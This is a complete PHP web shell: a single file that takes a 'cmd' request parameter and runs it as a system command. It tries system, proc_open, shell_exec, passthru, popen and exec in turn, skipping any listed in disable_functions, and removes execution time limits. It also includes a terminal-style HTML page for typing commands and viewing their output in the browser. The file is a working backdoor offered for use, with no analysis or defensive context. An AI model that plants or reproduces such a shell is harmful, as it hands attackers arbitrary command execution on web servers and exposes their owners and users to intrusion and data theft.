<?php 

if ( isset( $_REQUEST["cmd"] ) ) {

	header( "Content-type: text/plain" );

	$c=$_REQUEST["cmd"];
	@set_time_limit(0);
	@ignore_user_abort(1);
	@ini_set('max_execution_time',0);
	$z=@ini_get('disable_functions');
	if(!empty($z)){
		$z=preg_replace('/[, ]+/',',',$z);
		$z=explode(',',$z);
		$z=array_map('trim',$z);
	}else{
		$z=array();
	}
	$c=$c." 2>&1";
	function f($n){
		global $z;
		return is_callable($n) and !in_array($n,$z);
	}
	if(f('system')){
		ob_start();
		system($c);
		$w=ob_get_contents();
		ob_end_clean();
	}elseif(f('proc_open')){
		$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
		$w=NULL;
		while(!feof($t[1])){
			$w.=fread($t[1],512);
		}
		@proc_close($y);
	}elseif(f('shell_exec')){
		$w=shell_exec($c);
	}elseif(f('passthru')){
		ob_start();
		passthru($c);
		$w=ob_get_contents();
		ob_end_clean();
	}elseif(f('popen')){
		$x=popen($c,r);
		$w=NULL;
		if(is_resource($x)){
			while(!feof($x)){
				$w.=fread($x,512);
			}
		}
		@pclose($x);
	}elseif(f('exec')){
		$w=array();
		exec($c,$w);
		$w=join(chr(10),$w).chr(10);
	}else{
		$w=0;
	}
	print $w;
} else {

?>
<html>
<head>
	<style type="text/css"><!--
		body {
			font-family: tahoma, arial, sans-serif;
			font-size: 75%; /* 12px */
			padding: 10px 20px;
			background-color: black;
			color: lightgreen;
		}

		* {
			font-size: 1em; /* 12px */
		}
		a {
			color: lightgreen;
			text-decoration: underline;
		}

		pre {
			border: 2px solid lightgreen;
			font-family: courier new, fixed;
			width: 100%;
			height: 70%;
			padding: 5px;
			overflow: auto;
		}
		input, select {
			border: 1px solid lightgreen;
			background-color: black;
			color: lightgreen;
			padding: 5px;
			font-family: courier new, fixed;
			margin: 5px;
		}
		input[type="text"], select {
			width: 50%;
		}
		h2 {
			font-size: 1.25em;
		}
	--></style>
</head>
<body onload="document.forms[0].c.focus();">
	<script>
		function s(f) {
			p = f.p.value;
			c = f.c.value;

			document.getElementById("o").innerHTML += "> <a href='#' onclick='return sh(this);'>" + c + "</a>\n";

			var x = new XMLHttpRequest();
			x.addEventListener("load", function() {
				o = document.getElementById("o");
				o.innerHTML += this.responseText;
				o.scrollTop = o.scrollHeight;
			});
			x.open("GET", p + "?cmd=" + c);
			x.send();

			f.c.value = "";
		}
		function sh(a) {
			document.forms[0].c.value = a.innerText;
			document.forms[0].c.focus();
			return false;
		}
	</script>
	<form onsubmit="s(this);return false;">
		<input type="text" name="p" value="<?php echo $_SERVER['SCRIPT_NAME'] ?>" /> Shell Path
		<br />
		<input type="text" name="c" value="" autocomplete="off" /> Command
		<br />
		<input type="submit" value="Execute" />
		<br />
		<h2>Output</h2>
<pre id="o">
</pre>
	</form>
</body>
</html>
<?php

}
?>

